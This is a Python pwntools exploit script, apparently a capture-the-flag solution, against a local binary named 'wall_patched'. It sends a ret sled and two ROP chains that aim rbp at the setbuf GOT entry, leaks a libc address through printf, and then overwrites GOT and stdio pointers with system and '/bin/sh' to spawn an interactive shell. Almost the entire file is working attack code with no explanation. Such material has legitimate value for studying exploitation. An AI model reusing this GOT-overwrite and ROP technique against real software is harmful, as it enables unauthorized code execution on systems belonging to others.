#!/usr/bin/env python3

from pwn import *

exe = ELF("./wall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe

p = process()
gdb.attach(p,gdbscript='''
           b*0x0000000000401252
           b*0x0000000000401257
           b*0x00000000004011ac
           ''')
input()

pop_rbp = 0x000000000040115d
rop_printf = 0x00000000004011b1
rop_scanf = 0x0000000000401196

setbuf_got = exe.got.setbuf

ret = 0x000000000040101a


rop_chain = p64(pop_rbp)
rop_chain += p64(setbuf_got+0x80)
rop_chain += p64(rop_scanf)

payload = p64(ret)*505 + rop_chain
#input()

rop_chain2 = p64(pop_rbp)
rop_chain2 += p64(setbuf_got+0x80)
rop_chain2 += p64(rop_printf)
payload2 = p64(ret)*13 + rop_chain2

p.sendlineafter(b'Message: ',payload)
p.sendlineafter(b'What is your name? ',payload2)

p.recvuntil(b'Message from ')
p.recvline()
p.recvuntil(b'Message from ')

leak_got_setbuf = u64(p.recv(6).ljust(8,b'\x00'))

libc.address = leak_got_setbuf  - libc.sym.setbuf
print("lb: ",hex(libc.address))

payload_get_shell = p64(libc.sym.system) + p64(exe.sym.main) 
payload_get_shell += p64(0)*6 
payload_get_shell += p64(libc.sym._IO_2_1_stdout_) + p64(0)
payload_get_shell += p64(libc.sym._IO_2_1_stdin_) + p64(0)
payload_get_shell += p64(next(libc.search(b'/bin/sh\x00')))

p.sendline(payload_get_shell)
p.sendline(b'ls')


p.interactive()
